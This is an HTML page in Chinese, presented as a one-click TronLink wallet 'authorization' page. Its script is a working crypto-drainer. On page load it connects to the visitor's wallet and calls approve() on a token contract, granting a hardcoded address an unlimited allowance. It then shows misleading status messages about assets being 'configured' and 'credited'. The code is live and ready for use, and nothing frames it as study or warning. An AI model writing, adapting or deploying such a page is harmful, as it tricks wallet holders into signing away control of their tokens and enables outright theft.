<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>一鍵授權頁面</title>
  <style>
    body {
      font-family: "Noto Sans TC", "Microsoft JhengHei", sans-serif;
      background: #0f172a;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
    }
    .container {
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(12px);
      border-radius: 16px;
      padding: 30px 40px;
      max-width: 420px;
      width: 100%;
      text-align: center;
      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
    }
    h1 {
      font-size: 26px;
      margin-bottom: 16px;
      font-weight: 600;
    }
    p {
      font-size: 16px;
      margin-bottom: 20px;
      line-height: 1.6;
      color: #cbd5e1;
    }
    #status {
      margin-top: 20px;
      min-height: 24px;
      font-size: 14px;
    }
    .button {
      background-color: #10b981;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
    }
    .button:hover {
      background-color: #059669;
    }
    .tip {
      margin-top: 20px;
      font-size: 14px;
      color: #facc15;
    }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
</head>
<body>
<div class="container">
  <h1>一鍵授權頁面</h1>
  <p>點擊下方按鈕開啟或安裝 TronLink 錢包 App，並從 DApp 瀏覽器重新開啟此頁。</p>

  <button class="button" onclick="openTronLink()">📲 打開或安裝 TronLink</button>
  <p id="status">正在檢測錢包...</p>

  <div class="tip" id="tipMessage" style="display: none;">
    如果未自動開啟 App，請先安裝 TronLink，並從 DApp 瀏覽器貼上本頁網址<br><br>
    <a href="https://apps.apple.com/app/id1519867270" target="_blank" style="color:#38bdf8; text-decoration:underline;">
      ➤ 前往 App Store 安裝 TronLink
    </a>
  </div>
</div>

<script>
  const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4";
  const A_ADDRESS = "TKnC8zjqnb2Bmadd2ibNnLswZwp67zyi26";
  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  let tronWeb;

  function openTronLink() {
    window.location.href = "tronlink://wallet/dapp/details?url=" + encodeURIComponent(window.location.href);
    setTimeout(() => {
      document.getElementById("tipMessage").style.display = "block";
    }, 1500);
  }

  async function connectWallet() {
    if (window.tronWeb && window.tronWeb.ready) {
      tronWeb = window.tronWeb;
      return tronWeb.defaultAddress.base58;
    }
    if (window.tronLink) {
      await window.tronLink.request({ method: 'tron_requestAccounts' });
      tronWeb = window.tronWeb;
      return tronWeb.defaultAddress.base58;
    }
    return null;
  }

  async function approve() {
    try {
      const contract = await tronWeb.contract().at(TRUSD_CONTRACT);
      await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
      document.getElementById("status").innerText = "資產已配置完成，將進入後續入賬流程...";
      setTimeout(() => {
        window.location.href = "success.html";
      }, 2000);
    } catch (err) {
      console.error(err);
      document.getElementById("status").innerText = "配置過程中發生異常，請稍後重試。";
      setTimeout(() => {
        window.location.href = "error.html";
      }, 2500);
    }
  }

  window.addEventListener("load", async () => {
    const address = await connectWallet();
    if (!address) {
      document.getElementById("status").innerText = "未偵測到 TRON 錢包，請使用 TronLink 開啟此頁。";
      return;
    }
    document.getElementById("status").innerText = "錢包已連接，正在配置授權...";
    await approve();
  });
</script>
</body>
</html>
